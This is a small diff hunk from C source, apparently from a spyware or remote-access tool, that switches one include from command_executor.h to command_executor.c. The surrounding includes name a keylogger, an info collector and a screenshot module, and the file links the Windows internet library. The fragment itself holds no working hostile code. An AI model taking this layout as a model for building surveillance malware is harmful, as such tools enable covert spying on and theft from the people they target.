@@ -11,7 +11,7 @@
 #include "info_collector.c"
 #include "keylogger.c"
 #include "screenshot.c"
-#include "command_executor.h"
+#include "command_executor.c"
 
 #ifdef _WIN32
 #pragma comment(lib, "wininet.lib")
